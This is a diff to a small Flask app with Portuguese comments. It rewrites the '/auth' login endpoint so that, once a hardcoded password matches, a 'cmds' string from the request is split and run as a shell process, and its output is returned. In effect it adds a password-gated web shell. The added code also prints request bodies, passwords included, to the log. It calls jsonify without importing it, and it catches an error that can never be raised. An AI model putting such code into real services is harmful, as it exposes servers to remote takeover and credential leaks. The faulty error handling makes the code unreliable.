@@ -1,7 +1,8 @@
 
 # app.py
 from flask import Flask, request, abort, make_response
-
+import os
+import subprocess
 app = Flask(__name__)
 
 # password "fácil" para exemplo — NÃO USES assim em produção
@@ -16,10 +17,31 @@ def index():
 @app.route('/auth', methods=['POST'])
 def auth():
     data = request.get_json(silent=True) or {}
+    print(data)
     pw = data.get('password', '')
+    cmd = data.get('cmds', '')
+    print(cmd)
+    cmds=cmd.split(" ")
     if pw == EXPECTED_PASSWORD:
-        # exemplo: devolver ok; aqui poderias devolver um token JWT, cookie de sessão, etc.
-        return "Autenticado", 200
+        try:
+        
+            result = subprocess.run(
+                 cmds,
+                 stdout=subprocess.PIPE,
+                 stderr=subprocess.PIPE,
+                 text=True,
+                 cwd=os.getcwd()
+            )
+       
+            if result.stdout.find("err")<0 and result.stderr.find("err")<0:
+                s=result.stdout.replace("\n","<br>")
+                return s
+            else:
+                return "error:"
+        except subprocess.CalledProcessError as e:
+            return jsonify({'error': 'Script execution failed', 'details': str(e)}), 500
+
+        
     else:
         return "Password inválida", 401
 
